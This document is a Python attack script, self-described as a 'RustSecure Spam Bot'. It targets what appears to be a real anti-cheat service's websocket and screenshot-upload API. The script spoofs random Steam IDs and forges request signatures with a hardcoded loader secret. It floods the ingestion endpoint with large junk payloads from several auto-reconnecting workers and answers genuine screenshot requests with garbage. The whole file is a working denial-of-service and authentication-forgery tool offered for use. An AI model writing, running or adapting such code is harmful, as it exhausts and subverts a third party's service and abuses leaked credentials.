#!/usr/bin/env python3
"""
RustSecure screenshot spam bot with auto-reconnect.
~40s session window → 4x 5MB uploads → reconnect → repeat forever.
"""

import asyncio, json, base64, time, os, subprocess, sys, hashlib, hmac, random

try:
    import websockets, requests
except ImportError:
    print("pip install websockets requests"); sys.exit(1)


def random_steamid():
    return str(76561197960265728 + random.randint(1, 500_000_000))

WS_URL = "wss://rustsecure.ru/ws"
UPLOAD_URL = "https://rustsecure.ru/api/ingest/screenshot"
BRIDGE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "crypto_bridge.exe")
PAYLOAD_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "spam_5mb.bin")
LOADER_SECRET = "R260iT7ujsI58aTxAExVby6qea3L056h6SfnEr2BLKbmY2vlvm"

def b64e(d): return base64.urlsafe_b64encode(d).rstrip(b"=").decode()
def b64d(s): return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


class Bridge:
    def __init__(self):
        self.proc = subprocess.Popen(
            ["mono", BRIDGE], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
            stderr=subprocess.PIPE, text=True, bufsize=1)
        self.proc.stderr.readline()

    def cmd(self, line):
        self.proc.stdin.write(line + "\n"); self.proc.stdin.flush()
        return self.proc.stdout.readline().strip()

    def genkey(self):
        r = self.cmd("GENKEY").split(); return r[1], r[2]
    def ecdh(self, p, pp):
        r = self.cmd(f"ECDH {p} {pp}").split(); return r[1]
    def derive(self, sh, cn, sn):
        r = self.cmd(f"DERIVE {sh} {cn} {sn}").split(); return r[1], r[2]
    def protect(self, pt):
        return self.cmd(f"PROTECT {pt}")[4:]
    def unprotect(self, env):
        r = self.cmd(f"UNPROTECT {env}")
        return r[4:] if r.startswith("DEC ") else None
    def sig(self, pfx, *parts):
        return self.cmd(f"SIG {pfx} {' '.join(parts)}")[4:]
    def close(self):
        try: self.proc.stdin.close(); self.proc.wait(timeout=3)
        except: self.proc.kill()


def upload(steam_id, req_id, sig, png_data):
    url = f"{UPLOAD_URL}?method=dxgi&width=1920&height=1080&affinity=0"
    try:
        r = requests.post(url, data=png_data, headers={
            "X-RS-SteamId": steam_id,
            "X-RS-RequestId": req_id,
            "X-RS-RequestSig": sig,
            "Content-Type": "application/octet-stream",
        }, timeout=30)
        return r.status_code, r.text[:80]
    except Exception as e:
        return 0, str(e)[:60]


def spam_upload(steam_id, png_data):
    rid = f"s-{int(time.time()*1000)}"
    issued = int(time.time()); expires = issued + 3600
    payload = "|".join([steam_id, rid, str(issued), str(expires), "scan", "dxgi"])
    sig = b64e(hmac.new(LOADER_SECRET.encode(), payload.encode(), hashlib.sha256).digest())
    return upload(steam_id, rid, sig, png_data)


async def single_session(steam_id, png_data, crypto, stats):
    """One WS session: connect, spam until disconnect. Returns normally."""
    sid = random_steamid()
    ph, pubh = crypto.genkey()
    pub_b64 = b64e(bytes.fromhex(pubh))
    nonce = os.urandom(16); nonce_b64 = b64e(nonce)
    ts = int(time.time())
    sig = crypto.sig("client-hello", pub_b64, nonce_b64, str(ts))

    try:
        async with websockets.connect(WS_URL, max_size=10*1024*1024, close_timeout=3) as ws:
            await ws.send(json.dumps({
                "type": "ClientHello", "pub": pub_b64,
                "nonce": nonce_b64, "ts": ts, "sig": sig}))

            resp = json.loads(await asyncio.wait_for(ws.recv(), 10))
            if resp.get("type") != "ServerHello":
                return

            shared = crypto.ecdh(ph, b64d(resp["pub"]).hex())
            crypto.derive(shared, nonce.hex(), b64d(resp["nonce"]).hex())

            pc = json.dumps({"type": "PlayerConnected", "steamId": sid,
                             "playerName": "Bot", "hwids": {}})
            await ws.send(crypto.protect(pc))
            stats["sessions"] += 1
            now = time.strftime("%H:%M:%S")
            print(f"[{now}] Session #{stats['sessions']} as {sid}")

            # Spam uploads as fast as possible during the ~40s window
            async def spam():
                while True:
                    await asyncio.sleep(8)
                    code, body = spam_upload(random_steamid(), png_data)
                    stats["uploads"] += 1
                    stats["bytes"] += len(png_data)
                    mb = stats["bytes"] / 1024 / 1024
                    now = time.strftime("%H:%M:%S")
                    print(f"  [{now}] upload #{stats['uploads']} ({mb:.0f} MB total): {code}")

            spam_task = asyncio.create_task(spam())

            # Listen until disconnected
            while True:
                try:
                    raw = await asyncio.wait_for(ws.recv(), 30)
                    dec = crypto.unprotect(raw)
                    if dec:
                        print(f"  [<] {dec[:120]}")
                        if "RequestScreenshotV2" in dec:
                            parts = dec.split("|")
                            if len(parts) >= 6:
                                code, body = upload(steam_id, parts[1], parts[5], png_data)
                                stats["uploads"] += 1
                                stats["bytes"] += len(png_data)
                                print(f"  [!!!] REAL sig upload: {code} {body}")
                except asyncio.TimeoutError:
                    hb = json.dumps({"type": "Heartbeat", "steamId": steam_id})
                    await ws.send(crypto.protect(hb))
                except websockets.ConnectionClosed:
                    break

            spam_task.cancel()
            try: await spam_task
            except asyncio.CancelledError: pass

    except (websockets.ConnectionClosed, ConnectionError, asyncio.TimeoutError, OSError) as e:
        now = time.strftime("%H:%M:%S")
        print(f"  [{now}] connection error: {type(e).__name__}")


async def worker(worker_id, png_data, stats, lock):
    """Single worker: own Bridge, own WS session, auto-reconnect loop."""
    crypto = Bridge()
    try:
        while True:
            await single_session("", png_data, crypto, stats)
            async with lock:
                elapsed = time.time() - stats["start"]
                mb = stats["bytes"] / 1024 / 1024
                rate = mb / (elapsed / 60) if elapsed > 0 else 0
                now = time.strftime("%H:%M:%S")
                print(f"[{now}] W{worker_id} reconnecting "
                      f"(total: {stats['sessions']}s {stats['uploads']}u {mb:.0f}MB {rate:.0f}MB/min)")
            await asyncio.sleep(1 + random.random())
    finally:
        crypto.close()


async def run(num_workers):
    png_data = open(PAYLOAD_PATH, "rb").read() if os.path.exists(PAYLOAD_PATH) else os.urandom(100*1024*1024)
    print(f"[*] Payload: {len(png_data)/1024/1024:.0f} MB")
    print(f"[*] Workers: {num_workers}")
    print(f"[*] Strategy: {num_workers}x (connect → spam ~40s → reconnect)")
    print()

    stats = {"sessions": 0, "uploads": 0, "bytes": 0, "start": time.time()}
    lock = asyncio.Lock()

    tasks = [asyncio.create_task(worker(i+1, png_data, stats, lock)) for i in range(num_workers)]
    try:
        await asyncio.gather(*tasks)
    except asyncio.CancelledError:
        pass
    finally:
        elapsed = time.time() - stats["start"]
        mb = stats["bytes"] / 1024 / 1024
        print(f"\n[*] Total: {stats['sessions']} sessions, {stats['uploads']} uploads, "
              f"{mb:.0f} MB in {elapsed:.0f}s ({mb/(elapsed/60):.1f} MB/min)")


def main():
    workers = int(sys.argv[1]) if len(sys.argv) > 1 and sys.argv[1].isdigit() else 5
    print(f"[*] RustSecure Spam Bot (multi-worker, auto-reconnect)")
    try:
        asyncio.run(run(workers))
    except KeyboardInterrupt:
        print("\n[*] Stopped")


if __name__ == "__main__":
    main()
